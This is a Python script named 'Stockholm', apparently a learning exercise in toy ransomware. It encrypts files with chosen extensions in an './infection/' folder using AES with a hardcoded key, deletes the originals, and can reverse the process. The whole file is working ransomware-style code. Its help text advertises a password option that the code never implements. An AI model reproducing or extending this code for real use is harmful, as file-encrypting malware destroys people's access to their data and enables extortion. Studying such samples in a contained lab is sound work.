import os
import glob
from Crypto.Cipher import AES
import sys
KEY = b'password42424242'
silent = 0
path = './infection/'
extensions = './extensions'

def doDir(directory, flag):
    with open(extensions, 'r') as extensionsFile:
        allowedExtensions = [extension.strip().lower() for extension in extensionsFile.readlines()]
    pattern = os.path.join(directory, '*')
    files = glob.glob(pattern)
    
    for file in files:
        if flag == 0:
            encryptFile(file, allowedExtensions)
        else:
            reverseEncrypt(file)

def encryptFile(file, extensions):
    fileEx = os.path.splitext(file)[1]
    if fileEx in extensions:
        with open(file, 'rb') as fileR:
            plain = fileR.read()
        cipher = AES.new(KEY, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(plain)
        encryptFilePath = file + '.ft'
        with open(encryptFilePath, 'wb') as encryptedFile:
            [encryptedFile.write(x) for x in (cipher.nonce, tag, ciphertext)]
        os.remove(file)
        if silent == 0:
            print("File", file, "encrypted")

def reverseEncrypt(file):
    if file.endswith(".ft"):
        with open(file, 'rb') as encryptedFile:
            nonce, tag, ciphertext = [encryptedFile.read(x) for x in (16, 16, -1)]    
        cipher = AES.new(KEY, AES.MODE_EAX, nonce)
        plain = cipher.decrypt_and_verify(ciphertext, tag)
        decryptedFileName = file[:-3]
        with open(decryptedFileName, 'wb') as decryptedFile:
            decryptedFile.write(plain)
        os.remove(file)
        if silent == 0:
            print("File", file, "decrypted")
    
    
    
def help():
    print("Use -help or -h to show this message")
    print("Use -version or -v to show program version")
    print("Use -password or -p to set the encryption password and encrypt the files")
    print("Use -reverse or -r to revert the encryption")
    print("Use -silent or -s to avoid printing the files that are being encrypted")
    print("Without -password or -p it will use the default password")
    print("You can combine some of the flags, for example: ./stockholm -r -s or ./stockholm -p yourpass -r -s")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        if sys.argv[1] == '-help' or sys.argv[1] == '-h':
            help()
        elif sys.argv[1] == '-version' or sys.argv[1] == '-v':
            print ("Stockholm v0 by mvillaes")
        elif sys.argv[1] == '-reverse' or sys.argv[1] == '-r':
            doDir(path, 1)
        elif sys.argv[1] == '-silent' or sys.argv[1] == '-s':
            silent = 1
            doDir(path, 0)
    else:
        doDir(path, 0)